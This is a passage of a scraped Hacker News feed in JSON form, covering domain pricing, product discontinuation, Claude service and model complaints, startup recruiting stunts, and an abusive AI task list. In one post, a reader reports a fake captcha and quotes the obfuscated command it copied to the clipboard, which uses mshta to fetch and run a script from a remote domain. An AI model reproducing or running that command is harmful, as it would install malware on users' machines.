+      "post_text": "I registered the domain onlyfans.sexy ~6 years ago as a gag where I&#x27;d post pictures of fans (everything on the site and in this post is SFW).  This year I got an email stating that, like all prior years, the domain would auto-renew at $38 in seven days and didn&#x27;t think anything of the next two emails also notifying me that the domain would auto-renew.<p>It would seem that I very much SHOULD have paid attention to those next two emails, because in both the three and one day renewal emails the price changed from $38 to $3000.  Needless to say, I was surprised when I was billed $3k USD (plus tax).<p>After contacting Hover&#x27;s customer support, they told me that there was nothing that they could do about this and they have a no refund policy because &quot;Hover does not have the ability to override or reverse pricing set by the registry. Premium domain pricing, including renewal costs, is determined by the registry, and they may adjust those prices over time. Once a renewal has been processed, we are charged that fee immediately by the registry, and those charges are non-refundable to us.&quot;<p>So according to Hover, the .sexy registry (Uniregistry) sets prices as it sees fit, decided to jack up the renewal cost at the last minute because they can, and there&#x27;s simply nothing they or I can do about it. Has anyone here experienced anything similar?",
+      "is_ask_hn": true,
+      "matched_keywords": [],
+      "comments": [
+        {
+          "top": "I work at Tucows Domains/Hover and we're digging in on what happened here. I've reached out to the OP already via email. tl;dr our support team didn't handle this well at all and we've already issued a full refund.\nWe are still looking into where the price mismatch found its way into the picture, but that domain is a tiered price domain but it is also \"legacy\" priced meaning it should renew at something very close to the standard price for a renewal but didn't.",
+          "author": "james_pm",
+          "replies": [
+            {
+              "text": "For anyone reading the thread, they did do this!  Had a nice call with James too, which I appreciate.\nIt looks like the situation is actually more complex and interesting than \"The registry rug-pulled me\".  My .sexy domain price was increased by the owners of .sexy (to $3000) since I bought it 6 years ago BUT in Hover's system it was supposed to retain the legacy price of $38 as it had for the past few years.  Something went wrong between Hover and the registry where the legacy price wasn't honoured and as such, it bumped to $3000 on renewal.  Apparently support really flubbed this one and we both agreed that going the \"post on HN\" route for customer service isn't exactly a win on their part.\nThe money has been refunded and I've been assured they're looking into the bug.  Will probably do a follow up blog post!",
+              "author": "shrinks99",
+              "depth": 1
+            }
+          ]
+        },
+        {
+          "top": "Thankfully a chargeback is possible here. While a chargeback is almost always \"possible\" it can be dangerous if the company you are charging-back is the only provider of a service. I'd be wary about doing a chargeback on the Google/Amazon's of the world but Hover? There are many other registrars out there if you are willing to transfer and for $3K I'd be transfering my domains and then filing a chargeback.\nBUT, before you do that, threaten a chargeback. That might unstick their support or get your case bumped up the chain. If they still refuse then transfer and chargeback.",
+          "author": "joshstrange",
+          "replies": [
+            {
+              "text": "Although the timing was suspicious it looks like they might be correct about the price. namecheap has the same price \nhttps://www.namecheap.com/domains/registration/results/?doma...\n (a bit cheaper at porkbun around $2.5K)",
+              "author": "tommy_axle",
+              "depth": 1
+            },
+            {
+              "text": ">There are many other registrars out there if you are willing to transfer and for $3K I'd be transfering my domains and then filing a chargeback.\nIf what hover said is true (ie. \"the .sexy registry (Uniregistry) sets prices as it sees fit, decided to jack up the renewal cost at the last minute because they can\"), trying to transfer to another \nregistar\n won't fix the issue, because they'll just charge the same price.",
+              "author": "gruez",
+              "depth": 1
+            },
+            {
+              "text": "It will fix the problem of having paid $3000. Just want to add that while Hover might not be at fault, I don't think OP is either. I would have done the same thing (read the first renewal email and ignored the rest). I think Hover should change something, like adding \nPRICE CHANGE\n to the email headline or something similar.",
+              "author": "ktm5j",
+              "depth": 2
+            },
+            {
+              "text": "True, but you can abandon that domain (OP already said it was mostly a joke website) and transfer all the ones you do care about. If this .sexy domain is their only domain there then it's even easier, just chargeback and be done with it.",
+              "author": "joshstrange",
+              "depth": 2
+            },
+            {
+              "text": "Charge backs are generally not for returns.\nIf the charge was legal and within contract and customer regulations, then Hover might very well just challange the charge back.",
+              "author": "tossandthrow",
+              "depth": 3
+            }
+          ]
+        },
+        {
+          "top": "Had a thing with Hostgator once where they wouldn't accept any proof of who I was other than an expired credit card that had long since stopped being used. The site went up for sale, and someone bought it and had it up for resale for around $5,000. Turned me even sourer on the domain system of the normal net.",
+          "author": "thataccount",
+          "replies": [
+            {
+              "text": "Heh yeah, I've recently had another site succumb to the same thing (that domain wasn't managed by me).  I've long accepted that domains are kind of a racket, but haven't actually been on the losing end of the money until now!",
+              "author": "shrinks99",
+              "depth": 1
+            }
+          ]
+        },
+        {
+          "top": "You are paying for a domain on a gTLD, which is owned by an organization that can charge whatever it wants, and thousands to tens of thousands a year isn't uncommon.  Your registrar is only charging tens of dollars a year for their services and they aren't involved in the price hike.\nICANN started selling gTLDs in 2012 and they are not cheap, costing hundreds of thousands to procure, plus tens to hundreds of thousands a year to maintain, which is why prices for domains on that gTLD are usually pricey, too.\nThere's probably not much you can do, as you need to dispute with the owner of the gTLD, not the registrar, but in the future I recommend switching to either a traditional TLD (e.g. .com, .org, .net, etc.) for the lowest price or a country code (e.g. .io .tv .gg, etc.) which is usually pricier than a traditional TLD but much cheaper than a gTLD.",
+          "author": "dlcarrier",
+          "replies": [
+            {
+              "text": "Not exactly. We’re a common law country, and there is an implied covenant of good faith.  It’s for a judge to decide if this price change counts as good faith.  OP should file a complaint and let a judge decide.",
+              "author": "tonymet",
+              "depth": 1
+            },
+            {
+              "text": "Are you in the Cayman Islands?  It looks like that's where the owner of the gTLD, Internet Naming Co., is based.  Did you mean commonwealth or common law?  Either way, their pricing is in line with other gTLD providers and there's no sign that they didn't violate any territory's regulations or ICANN policy, so there's not really any reason for a judge to rule against the gTLD provider.\nA method for a more likely success to contact the gTLD provider and ask if a cancellation is possible.\nEdit: It looks like the registrar got in contact with shrinks99 (\nhttps://news.ycombinator.com/item?id=49099021#49100427\n) who qualified for grandfathered price that was accidentally not applied.",
+              "author": "dlcarrier",
+              "depth": 2
+            },
+            {
+              "text": "common law. and both the registrar and the gtld have american entities you can bring to court. otherwise they wouldn't be collecting revenue.",
+              "author": "tonymet",
+              "depth": 3
+            },
+            {
+              "text": "The original pricing didn't break any US regulations.  Of course, anyone can bring anyone else to court for any reason, but if the defendant didn't break any regulations, the plaintiff won't prevail, and publicly asserting that the defendant did so, when contrary to evidence, could leave the plaintiff liable for defamation.\nIt's also an awful place to start from, as a good-faith effort to settle the  matter is much cheaper for both sides, and the only way to prevail when no regulations were violated.",
+              "author": "dlcarrier",
+              "depth": 4
+            }
+          ]
+        },
+        {
+          "top": "The price change on the registry happened a few years ago, so in that sense Hover is powerless. But when they sent you the renewal notice (and indeed at the time of the price change), they should have sent you a clear warning that the price was going to increase by ~10,000%. istm you have a basis for the chargeback if they indeed offered to renew it at $38 and you thought nothing was amiss; presumably you wouldn't have bothered to renew if you knew in advance.",
+          "author": "anigbrowl",
+          "replies": []
+        }
+      ]
+    },
+    {
+      "id": "49095601",
+      "title": "Ask HN: Anyone else tired of brands discontinuing your favorite everyday items?",
+      "link": "https://news.ycombinator.com/item?id=49095601",
+      "domain": "news.ycombinator.com",
+      "author": "GreenPencil7",
+      "score": 45,
+      "comment_count": 37,
+      "created_ts": 1785321035,
+      "is_internal": true,
+      "post_text": "Hi everyone,\n1 I&#x27;ve run into the same problem over and over again. When an item wears out, I can&#x27;t buy the exact same one anymore. \nIt&#x27;s been discontinued. Or it has been changed while keeping only the same name.<p>2 I assume this isn&#x27;t only my problem. I&#x27;ve heard many stories about people not being able to buy the same shoes, T-shirt, perfume, or jacket again.<p>3 I understand why manufacturers do this. I have no questions for them. What matters more to me here is us — customers, or simply people. And I started wondering: what could be done to support a customer&#x27;s choice for years?<p>4 This is where I want to bring concepts from software and hardware engineering into the clothing industry — LTS and APIs. What if we freeze the standard and support it? We already have things like SATA or CPU sockets. Why not build a similar concept for clothing? Then the API at the point of contact with the customer is divided into a physically immutable part (color, material, design) and a flexible part (logistics, ingredients). Let&#x27;s start with the simplest base — a T-shirt. Why not give it LTS support? The idea is that the exact same T-shirt could be sold for 1, 5, or 20 years.<p>5 Where does my logic break down? What am I overlooking? Are there any similar projects? And would you become a customer of such a company?<p>Thanks.",
+      "is_ask_hn": true,
+      "matched_keywords": [],
+      "comments": [
+        {
+          "top": "Discontinuing a product breaks the cost-comparision chain. It makes it easier to increase prices or reduce quality without direct backlash. Releasing new products also makes for marketing announcements that work like advertisement (or is advertisement directly).",
+          "author": "explorigin",
+          "replies": [
+            {
+              "text": "A consumer watch dog that meticulously tracks equivalents to combat this would be an interesting project.",
+              "author": "CSSer",
+              "depth": 1
+            }
+          ]
+        },
+        {
+          "top": "There might be something to this.  It does seem older models of things are better than newer models of things.  So it could be the drive to lower costs and increase profits are causing this, at the appliance, car, etc. level.\nIt doesn't explain why every couple of years I have another four or six pairs of yet another set of socks, from the same company, but with enough variation that now I have multiple different generations of CK socks that aren't pairable.",
+          "author": "mancerayder",
+          "replies": [
+            {
+              "text": "That's why I repurpose or discard all of my old socks every time I Invest in a new set. I do this about every two years. I rotate them for uniform wear. I've successfully eliminated the possibility of mismatched socks.",
+              "author": "LandStander",
+              "depth": 1
+            },
+            {
+              "text": "Forced sock upgrades with no backwards compatibility.",
+              "author": "mancerayder",
+              "depth": 2
+            },
+            {
+              "text": "> It doesn't explain why every couple of years I have another four or six pairs of yet another set of socks, from the same company, but with enough variation that now I have multiple different generations of CK socks that aren't pairable.\nMost sock brands don't actually produce socks, they license the brand name out to third-party textile manufacturers to make the product.\nThey'll often switch partnerships to new manufacturers which has a drastic impact on the produced product in terms of materials, feel, overall quality, etc.\nIn many cases they even license the brand out to multiple manufacturers simultaneously, using different manufacturers for higher end stores than cheaper department stores, so even in the same time period you could get very different socks of the same style from the same brand depending upon where you buy them.\nSame core problem as typical cost-cutting enshittification -- everything is hyper-optimized to extract the maximum amount of value at the expense of every other consideration.",
+              "author": "georgemcbay",
+              "depth": 1
+            }
+          ]
+        },
+        {
+          "top": "Your logic breaks down at the critical point of sourcing: not only must we have the means of production and the schematics, we also need the original materials required to create the stuff.  If we lose access to the original materials, or if they are no longer available, then the rest of the chain doesn't matter.\nHowever, I do find promise in one aspect of your idea: an infinite archival catalogue of items-that-once-were.  Then, you can link to things like, as others have mentioned, eBay listings where you can still find the \"originals.'",
+          "author": "summarybot",
+          "replies": []
+        },
+        {
+          "top": "I've been wearing the same pair of shoes for (Vans Camacho) twelve years now because I cannot find any that actually fit my feet. Vans made these shoes that I purchased over and over again for ten years, but discontinued them in 2016. I've had to learn cobbling to some degree to keep these shoes going, though now the bottoms of the soles are so thin that my big toe might finally wear through them in the next year. It is ridiculous that in twelve years I haven't been able to find a replacement for something so simple.",
+          "author": "Tanoc",
+          "replies": [
+            {
+              "text": "I have a discontinued shoe that I really like and I've had great luck getting them on eBay lightly used. I keep a few spare pairs and swap individual shoes out as they wear. You might be concerned about odor/cleanliness but I've had a good success rate, the sellers with good reviews that are doing this professionally have the hygiene program down pat.",
+              "author": "rickypp",
+              "depth": 1
+            },
+            {
+              "text": "I'm so impressed by your ability to keep them going but it looks like ebay still has a ton of pairs of them if you want to stock up.",
+              "author": "hn_user82179",
+              "depth": 1
+            }
+          ]
+        },
+        {
+          "top": "I’ve had this happen with the clothes I get from Patagonia. What was only a few years ago a thick plaid button down is now thin and not nearly as warm. And Patagonia still makes good stuff! But I do wonder if it’s time to start shopping around again.",
+          "author": "dividedcomet",
+          "replies": [
+            {
+              "text": "take a intl trip and buy stuff from locals.\nlike the tribal type of people who live close or off the land.\nit won’t be cheap but you also won’t be paying 60% of the price for the brand name alone.\nthat kinda stuff is so high quality and lasts forever. plus it looks dope af compared to whatever you can buy from a retail store made by a mix of man and machine.",
+              "author": "moomoo11",
+              "depth": 1
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "49080775",
+      "title": "Tell HN: Our paid Claude AI subscription unavailable >1 week and no support",
+      "link": "https://news.ycombinator.com/item?id=49080775",
+      "domain": "news.ycombinator.com",
+      "author": "KellyCriterion",
+      "score": 45,
+      "comment_count": 21,
+      "created_ts": 1785225619,
+      "is_internal": true,
+      "post_text": "Dear all,<p>our team is using a Claude AI Team plan for more than 1 year already:<p>- we are a normal company, doing normal business, nothing critical<p>- all our bills are paid and we can see them as paid<p>- nontheless, the service is not available for more than one week to us<p>Question:<p>- any other idea to reach out to them than their &quot;Fin AI Chatbot&quot; at support@anthropic.com?<p>- did anybody else had the same experience? If yes, what helped to solve it?<p>Its really frustrating :-(<p>(especially since some people built their interal workflow around Claude, now they are somehow stuck)",
+      "is_ask_hn": false,
+      "matched_keywords": [
+        "team"
+      ],
+      "comments": []
+    },
+    {
+      "id": "49084404",
+      "title": "Ask HN: Crooked Timber showed showed me a virus captcha, What now?",
+      "link": "https://news.ycombinator.com/item?id=49084404",
+      "domain": "news.ycombinator.com",
+      "author": "Jgoauh",
+      "score": 43,
+      "comment_count": 47,
+      "created_ts": 1785248736,
+      "is_internal": true,
+      "post_text": "Hello everyone,\nThis morning, as i started my shift, i thought i would start visiting some news blogs &#x2F; websites to kick off the day. When it got to Crooked Timber i saw a captcha page instead, it looked like a traditional Google captcha.\nI clicked it, the spinner spun, and a box opened on the right, showing the traditional &quot;Verify you&#x27;re human&quot; white title on a blue background.<p>It showed 2 &quot;Manual Verification Steps&quot; :\n1. Press Win + R\n2. Press Ctrl + V and press Run<p>At first i assumed it was a new type of captcha checking i a physical keyboard was attached to the browser. But i instantly recognized the attempt to make me run a script on my machine.<p>I opened a new type and to my surprise, the something new was in my clipboard : \n&quot;pcalua -a &quot;PowerShell&quot; -c &quot;saps cmd &#x27;&#x2F;v&#x2F;c m^s^h^t^a h^t^t^p^s^:^&#x2F;^&#x2F;fine-work-team.com&#x2F;6272&#x27; -Wi Hi&quot;&quot;<p>I submited it to one of LLMs my work gives me access to, which told me to absolutly not run it (i wasn&#x27;t planning to) and explained the command would download and run a script from the URL.<p>How do i protect myself from these scams &#x2F; hack attempts in the future ? i always tought of myself &quot;prepared&quot; but i was surprised.<p>Has this happened to you before ? How do you protect yourself ?",
+      "is_ask_hn": true,
+      "matched_keywords": [
+        "team"
+      ],
+      "comments": []
+    },
+    {
+      "id": "49058956",
+      "title": "Robotics development made dead simple (open source)",
+      "link": "https://news.ycombinator.com/item?id=49058956",
+      "domain": "news.ycombinator.com",
+      "author": "Ekami",
+      "score": 22,
+      "comment_count": 7,
+      "created_ts": 1785078806,
+      "is_internal": true,
+      "post_text": "Hey everyone,<p>My team and I have been working hard on this project: https:&#x2F;&#x2F;peppy.bot<p>It&#x27;s a direct replacement for ROS 2. We already have the OpenArm robot (https:&#x2F;&#x2F;openarm.dev) working on the platform, both v1.0 and v2.0, plus Isaac Sim and MuJoCo integration.<p>If you&#x27;re in a hurry, head over to https:&#x2F;&#x2F;docs.peppy.bot&#x2F;quickstart&#x2F; and get started in 5min.<p>Our long term vision is to allow anyone (even non-devs) to go from a prompt to real humanoid robot actions, first in simulation, then on the physical robot.<p>Happy to answer any question.",
+      "is_ask_hn": false,
+      "matched_keywords": [
+        "team"
+      ],
+      "comments": []
+    },
+    {
+      "id": "49104709",
+      "title": "For the cheap price of a permanent tatto, get access to job interview",
+      "link": "https://news.ycombinator.com/item?id=49104709",
+      "domain": "news.ycombinator.com",
+      "author": "NoRagrets",
+      "score": 10,
+      "comment_count": 8,
+      "created_ts": 1785370506,
+      "is_internal": true,
+      "post_text": "A recent YC Startup School afterparty is making the rounds on LinkedIn.<p>7 people came to the YC after party left with permanent tattoos.<p>Lemon Lime had invited a tattoo artist to their office. Anyone willing to get the company’s logo tattooed immediately received a job interview.Seven people walked away with permanent tattoos.<p>Offering someone a job interview in exchange for getting a permanent tattoo is unethical.<p>The issue isn’t that seven adults chose to get tattooed. It’s that an employer tied access to a career opportunity to an irreversible change to someone’s body.<p>Is it really ‘consent’? There is an inherent power imbalance between companies and job seekers, especially in highly competitive environments like YC. That makes “consent” far more complicated than simply saying yes.<p>A great company should hire people for their talent, judgment and character…not their willingness to permanently mark themselves for a chance at an interview.<p>A line was crossed. And it’s a YC company. Is the job market so awful? How is this even legal?",
+      "is_ask_hn": false,
+      "matched_keywords": [
+        "startup",
+        "career",
+        "job market",
+        "interview"
+      ],
+      "comments": [
+        {
+          "top": "I would absolutely never hire someone that impulsive and/or gullible.",
+          "author": "ungreased0675",
+          "replies": []
+        },
+        {
+          "top": "Questionable behavior from YC companies is nothing new.",
+          "author": "zerohp",
+          "replies": []
+        },
+        {
+          "top": "They didn’t say they weren’t going to interview untattooed people.\nIt’s a lame stunt but this is just looking for something to get upset over.\nI would do it if the company was one I was excited about.\nI’m 45-ish and got my first tattoo this year. It’s a big eagle holding a bagel on my forearm. The coffee shop (their name is also on the tattoo) I go to said they’d give me free cold brew for life if I got it.",
+          "author": "paulcole",
+          "replies": [
+            {
+              "text": "> I would do it if the company was one I was excited about.\nNever would I ever do something like that. Doesn't matter how excited a company makes me, I'm not turning my body into a biological billboard. Different (brush) strokes for different folks I guess.\nEven though anatomically it doesn't really work out that way, when I was a kid I always wanted to get a tattoo of a plant along my calf so that it would look like the plant was growing as I got taller over the years.\nTangentially, there are also studies suggesting a possible statistical association between tattoo ink and an increased risk of certain cancers, such as lymphoma. Shocker, subepidermally injected permanent pigments may not be good for you.",
+              "author": "vunderba",
+              "depth": 1
+            },
+            {
+              "text": "How many cups of cold brew until the 'break even' point for the cost of the tattoo? or did the coffee shop provide the artist and ink? im just curious about the economics of permanent advertising space.  how many years has the shop been open? i ask because the failure rate for coffee shops etc is heavily weighted in the first decade of being open, so 'for life' might be a stretch.",
+              "author": "notrustincloud",
+              "depth": 1
+            },
+            {
+              "text": "Tattoo was $375-ish (I paid) and cold brew is $5.50. I kind of saw it as a hedge against inflation as well. Figured they’d be $7 before too long.\nI got the tattoo done by the artist who designed it (the shop puts up a lot of local art). She thought it was funny and was excited to do it. I think it looks sick.\nMy average ticket has actually gone up because they started selling house-made bagel chips and I tip pretty generously. So it’s more been a fun thing than a money saver.\nThis place has been open for ~10 years and I’ve been going regularly since 2020-ish. My total spend there since start of 2020 is $11,700.\nAnd my girlfriend has been threatening to tell the owner to take cold brew off the menu if I don’t keep up with my household chores. I didn’t see that one coming.",
+              "author": "paulcole",
+              "depth": 2
+            },
+            {
+              "text": "i see. more 'i got a tattoo of my favorite coffee hang out because i thought it looked cool' and they got you to use the cold brew as a hook to spend more. and it  cost them nothing for the walking Ad. naruhodo...\"i see\"",
+              "author": "notrustincloud",
+              "depth": 3
+            }
+          ]
+        },
+        {
+          "top": "How is an adult consenting to getting a tattoo legal? Is that your question? The rest is filler.",
+          "author": "amazingamazing",
+          "replies": []
+        }
+      ]
+    },
+    {
+      "id": "49102371",
+      "title": "YC startup offers interviews to people who get their name permanently tattooed",
+      "link": "https://news.ycombinator.com/item?id=49102371",
+      "domain": "news.ycombinator.com",
+      "author": "codexon",
+      "score": 9,
+      "comment_count": 4,
+      "created_ts": 1785355751,
+      "is_internal": true,
+      "post_text": "Thought this was interesting. Clever recruitment tactic or too much?<p>linkedin.com&#x2F;posts&#x2F;jordan-zietz_7-people-left-our-yc-afterparty-with-permanent-activity-7487979543744614401-IFU-",
+      "is_ask_hn": false,
+      "matched_keywords": [
+        "startup"
+      ],
+      "comments": [
+        {
+          "top": "How uninventive. The debased payoff is an interview for the desperate. Selection effects are terrible for both parties. Personally I find this marketing as distasteful as Monster.\nText:\n  7 people left our YC afterparty with permanent tattoos.\n\n  We hosted a YC Startup School afterparty at the LemonLime office to meet exceptional people, and find out which of them are just as crazy as we are.\n\n  That’s why we brought an actual tattoo artist to our party and offered an instant interview to anyone who got a LemonLime tattoo.\n\n  We are bold, we take risks, and we do things that haven’t been done before. Being committed to our mission is paramount. Pre-requisites for building the future.\n\n  If you’re reaching out to us to apply for a job, you might want to take notes.",
+          "author": "robocat",
+          "replies": [
+            {
+              "text": "What did Monster do?  I'm not familiar with the lore.",
+              "author": "dlcarrier",
+              "depth": 1
+            }
+          ]
+        },
+        {
+          "top": "LinkedIn lunatics should be studied as a mental illness phenomenon",
+          "author": "Oras",
+          "replies": []
+        },
+        {
+          "top": "Thats gross. Sociopath behavior.",
+          "author": "fun_hat",
+          "replies": []
+        }
+      ]
+    },
+    {
+      "id": "49101448",
+      "title": "Ask HN: What have you been curious about?",
+      "link": "https://news.ycombinator.com/item?id=49101448",
+      "domain": "news.ycombinator.com",
+      "author": "adityaathalye",
+      "score": 7,
+      "comment_count": 11,
+      "created_ts": 1785350967,
+      "is_internal": true,
+      "post_text": "If you are anything like me, you will have about five answers at any given point in time for &quot;What are you curious about?&quot;.<p>Arguably, a more interesting, revealing, and kinder question is; &quot;What have you been curious about?&quot;.<p>I feel a looking-back-to-curiosity exercise has power to shed light on where to look ahead (and why to do it). More so, I feel it has power to grant permission to that &quot;insatiably curious thirteen year old self&quot; to step out and play. Because it probably already has been up to something, while your attention was elsewhere.<p>So, here is a prompt (see what I just did there? ;-))<p>Um... Except for LLM stuff, if you please. Just for this thread. Because these days the plurality of HN discussion appears to be about the curiosities of LLMs.<p>(cf. More about this in a blog post I published a while back https:&#x2F;&#x2F;www.evalapply.org&#x2F;posts&#x2F;what-have-you-been-curious-about&#x2F; )",
+      "is_ask_hn": true,
+      "matched_keywords": [],
+      "comments": []
+    },
+    {
+      "id": "49098829",
+      "title": "Ask HN: How would you learn AI-assisted development from the ground up?",
+      "link": "https://news.ycombinator.com/item?id=49098829",
+      "domain": "news.ycombinator.com",
+      "author": "SMAAART",
+      "score": 5,
+      "comment_count": 6,
+      "created_ts": 1785339095,
+      "is_internal": true,
+      "post_text": "I&#x27;m a director&#x2F;exec, not a software engineer. Background&#x27;s mostly data analytics, SQL and Excel day to day, some R and PostgreSQL. Years ago I could hack together basic HTML&#x2F;CSS&#x2F;PHP too.<p>Got into AI early and now use ChatGPT and Claude constantly. With their help I&#x27;ve built a handful of web apps, some Python scripts and desktop tools, and an Android app on Supabase with real multiple users.<p>So I can build things. But I&#x27;m very aware there are big holes underneath it. I can usually get something working without really knowing why it works, whether it&#x27;s actually well built, or what&#x27;s going to break down the road once it gets more complex.<p>Feels like it&#x27;s time to go back to fundamentals. Michael Jordan still worked on his footwork, that kind of thing.<p>What I&#x27;m hoping to get to eventually:<p>* build small useful apps, windows&#x2F;mac&#x2F;android&#x2F;ios&#x2F;web<p>* automate chunks of my own and my team&#x27;s work<p>* maybe build a simple SaaS at some point<p>* generally not get left behind, open to this reshaping my career or spinning into a side thing<p>Was hoping for something structured, starting from prompt&#x2F;context engineering and working into real programming fundamentals, APIs, databases, architecture, security, testing, deployment. Problem is anything I find is stale within months given how fast this moves.<p>Not looking for free necessarily, and definitely not looking for &quot;learn to code in a weekend.&quot; Willing to put in real time.<p>For people who&#x27;ve gone down this road already: what&#x27;s actually worth learning properly, what&#x27;s fine to just learn enough to supervise, and what can honestly just stay AI&#x27;s job?<p>P.S.: Yes I polished&#x2F;refined this post using AI, but I first wrote it all myself (the original was twice as long).",
+      "is_ask_hn": true,
+      "matched_keywords": [
+        "team",
+        "career",
+        "director"
+      ],
+      "comments": []
+    },
+    {
+      "id": "49098495",
+      "title": "Ask HN: Do you think Opus 5 will improve?",
+      "link": "https://news.ycombinator.com/item?id=49098495",
+      "domain": "news.ycombinator.com",
+      "author": "logicallee",
+      "score": 5,
+      "comment_count": 0,
+      "created_ts": 1785337472,
+      "is_internal": true,
+      "post_text": "Claude&#x27;s Opus 5 is a recent model and has been very problematic as a drop-in replacement for Opus 4.8, including ignoring our well-documented deploy process (clearly described in our short claude.md file and short architecture file) and breaking production immediately upon being activated.<p>Currently, I added a supervisor layer where an Opus 4.8 instance supervises Opus 5 and corrects it.  It helped a little.  I am thinking of downgrading to Opus 4.8 but want to give Opus 5 a chance.<p>Do you think this model will improve or will it stay stuck at its current level of capabilities?<p>You can see complaints from other people:<p>https:&#x2F;&#x2F;www.reddit.com&#x2F;r&#x2F;ClaudeAI&#x2F;comments&#x2F;1v92csh&#x2F;opus_5_extremely_rlfried_and_mistakeprone_for&#x2F;<p>&quot;Opus 5 is truly not good for any task, imo. i have thoroughly tried it in every possible role in a large, complicated project. it is bad for all tasks.&quot;<p>Claudebot&#x27;s summary of the thread:<p>&gt;The overwhelming consensus in this thread is that Opus 5 is a buggy, overconfident mess and a significant regression from Opus 4.8 for complex coding.",
+      "is_ask_hn": true,
+      "matched_keywords": [],
+      "comments": []
+    },
+    {
+      "id": "49103837",
+      "title": "Ask HN: Is everybody's Claude weekly quota reset time the same?",
+      "link": "https://news.ycombinator.com/item?id=49103837",
+      "domain": "news.ycombinator.com",
+      "author": "0gs",
+      "score": 4,
+      "comment_count": 5,
+      "created_ts": 1785363606,
+      "is_internal": true,
+      "post_text": "maybe it&#x27;s like TM, and we&#x27;re not supposed to know.<p>for me, weekly reset is (has always been? surprisingly constant despite all the other UI&#x2F;UX&#x2F;model motion) 4P ET thursday, rain or shine, regardless of plan.<p>knowing what i know about software release cycles&#x2F;superstitions&#x2F;wisdom, it feels like it might be one and done. which would be nuts!<p>anybody know? apologies if dupe!",
+      "is_ask_hn": true,
+      "matched_keywords": [],
+      "comments": []
+    },
+    {
+      "id": "49102685",
+      "title": "Senior Dev Imposter Syndrome",
+      "link": "https://news.ycombinator.com/item?id=49102685",
+      "domain": "news.ycombinator.com",
+      "author": "daltonlcarr",
+      "score": 4,
+      "comment_count": 1,
+      "created_ts": 1785357201,
+      "is_internal": true,
+      "post_text": "I see a lot of people struggle heavy with this lately. Some of you top level&#x2F; top salary devs; what does your day looks like, compared to a mid range developer? What are you doing differently or better?",
+      "is_ask_hn": false,
+      "matched_keywords": [
+        "senior",
+        "salary",
+        "imposter"
+      ],
+      "comments": []
+    },
+    {
+      "id": "49105009",
+      "title": "Sfwig – had a laugh with AI, then a question",
+      "link": "https://news.ycombinator.com/item?id=49105009",
+      "domain": "news.ycombinator.com",
+      "author": "eilepsalpeh",
+      "score": 3,
+      "comment_count": 0,
+      "created_ts": 1785373500,
+      "is_internal": true,
+      "post_text": "THESE ARE THE NEXT TODOS!<p>SORT THEM, ANALYZE THEM TOGETHER WITH THE SCREENSHOTS, CREATE IMPLEMENTATION PLAN, EVERY TODO IS A COMMIT! STOP WHEN READY TO IMPLEMENT!<p>regressions, your underperforming, bad implementations, needs fixing:<p>general:\nthe main view box ALWAYS HAS EQUAL GAPS TO THE FUCKING VIEWPORT&#x2F;WINDOW FRAME! CURRENTLY IT IS SOMETIMES STICKING ON THE BOTTOM, SOMETIMES NOT!! WHAT THE FUCK! YOU UGLY PIECE OF SHIT!\nthe hexagon-button looks ugly as shit, YOU DID NOT MADE THE EDGES EQUAL LENGTH! YOU FUCKING LIAR!\nthe octagon-button is not a octagon! FAIL! FIX THIS! ALSO NO FUCKING BORDERS WHEN BUTTON IS ACTIVE!\nTHE STYLE OF THE BUTTONS CAN NEVER BE USED FOR ANYTHING ELSE THEN BUTTONS! YOU FUCKED THAT UP COMPLETELY! TASTELESS PIECE OF CRAP!\nthe app starts with a blank white screen! THIS IS UNWANTED! NOTHING GETS SHOWN BEFORE THE THEME IS NOT LOADED! PRIORITIES!\ntheme library:\nthe primary color does not get respected by the coloring of the app! THE LABELS, BUTTON BORDERS, WHY IS THIS A SINGLE NON-MANAGED ORANGE COLOR??? WHAT THE FUCK ARE YOU DOING?\nthe name field and the theme gallery take the whole width of the viewport??? HOW STUPID ARE YOU??? THIS IS UNACCEPTABLE! YOU COULD HAVE CHECKED THAT WITH A SCREENSHOT AND YOU DID NOT YOU PIECE OF SHIT!\nthe color selectors are big long black boxes with a tiny dot at the right end to chose&#x2F;show the color??? FOR FUCK SAKE!!! GO FUCK YOURSELF! PROFESSIONAL WORK OR YOU ARE FIRED!\nthe clear image button in the image layer preview picture HAS TO BE A FUCKING RED GARBAGE BIN AND NOT A DEFAULT STANDARD BUTTON YOU TASTE- AND SENSELESS FUCKING PRICK!\nthe button-selector has nothing to do with the &quot;BACKGROUND COLOR LAYER&quot;!! WHY IS IT GROUPED THERE??? WHY IS IT FUCKED BY THE OVERFLOW HIDDEN SETTINGS OF THE FUCKING SURROUNDING BOX??? THIS WILL NEVER WORK AND WAS ALSO NOT TESTED!\ndevices view:\nthe mobile client side pairing handling is completely undone. nothing is styled and dynamic! the mobile client side reacts automatically when permission is granted, is toroughly styled and also dynamic in UI&#x2F;UX! THERE IS A CLOCK SHOWING HOW LONG THE DEVICES IS ALREADY WAITING AND A COUNTDOWN SHOWS THE REMAINING TIME THE DESKTOP USER HAS TO APPROVE!! ALL THIS IS SUPPORTED WITH SIO! FUCK YOUR DEAD SHIT!\nin the desktop view, the pair button is big and prominent centered in the left view part and NOT PLACED UPPER RIGHT! BOTH VIEW PARTS ARE EQUALLY IN WIDTH!!! 50&#x2F;50!!!! ON THE LEFT SIDE ARE THE DEVICES WITH THEIR GENERATED QR-CODES UNTIL THEY ARE ACCEPTED AND THEN DISPLAYED ON THE RIGHT SIDE YOU STUPID FUCK! as soon as possible the device type and operating system with a fingerprint id which is not longer then 12 chars gets shown! we do not need to show the user a 32 char long id!!\nthe block&#x2F;accept&#x2F;unblock states are completely fucked and not working, once the device is blocked. what the fuck is this? nothing was tested, HOW CAN THIS BUG HAPPEN YOU PIECE OF SHIT?\nthe ideas view and implementation:\nnothing works! still unresolved bugs! ideas cannot be created and used! NOTHING WAS TESTED! YOU SUCK! FIX THIS ALL!\nmobile mode:\nWHY DOES LOADING OF THE MOBILE MODE&#x2F;APP TAKES A MINUTE????\nthe view indicator bars at the top should not be influenced by the button style!! THEY ARE SQUARE BARS! 8px in height!\n&quot;missing required idea fields: meta&quot; - WHY IS THIS BUG IN THE X-TH ITERATION STILL THERE AND A BLOCKER??? LAZY BASTARD!\nTHERE HAS TO BE NO FUCKING BAR WITH A SINGLE ICON BUTTON FOR SCANNING AT THE TOP! THIS BAR HAS TO GO! THE SCAN BUTTON IS FLOATING IN THE BOTTOM RIGHT CORNER AND IS ONLY VISIBLE IN THE INVENTORY OVERVIEW VIEW! ONLY!\nin the inventory view, there are only space for 4 rows of things! not more! the quickview NEEDS (!!!!) 50% OF THE FUCKING VIEWPORT 